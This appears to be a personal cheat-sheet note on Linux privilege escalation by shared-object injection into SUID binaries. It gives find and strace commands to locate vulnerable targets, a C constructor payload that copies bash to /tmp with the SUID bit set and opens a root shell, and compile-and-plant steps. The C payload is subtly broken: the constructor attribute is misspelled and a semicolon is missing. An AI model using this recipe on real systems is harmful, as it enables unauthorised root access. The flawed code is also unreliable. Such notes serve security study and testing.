---
aliases:
  - Linux Shared Object Injection
tags:
  - tech
  - cybsec
  - linux
  - privilege_escalation
  - privesc
  - suid
  - set_user_id
author: Mehdi N Tehrani
creat_date: 2023-12-17
category: Cyber Security
subcategory: Linux Security
---
# 1. Find a file where SUID is set
```
find /  -type f -perm -04000 -ls 2>/dev/null
                      ^ all of the permission bits mode are set
```
# 2. Is file vulnerable to so-injection
```
strace <file> 2>&1 | grep -iE 'open|access|no such file'
```
And also find the path of files which the executable is dependent on but missing
# 3. build c code to exploit
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((contructor));

void inject(){
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p")
}
```

[linux.die.net](https://linux.die.net/man/1/bash)
- **bash -p** 
	- Turn on privileged mode. In this mode, the $ENV and $BASH_ENV files are not processed, shell functions are not inherited from the environment, and the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored. If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, these actions are taken and the effective user id is set to the real user id. If the -p option is supplied at startup, the effective user id is not reset. Turning this option off causes the effective user and group ids to be set to the real user and group ids.

# 4. compile and move to path
```
gcc -shared -fPIC -o <out_file> <in_file.c>
```
move the shared object to the path found in step 2

# 5.  run the file with dependency on this so file
run the executable and this should result in a bash with root permissions

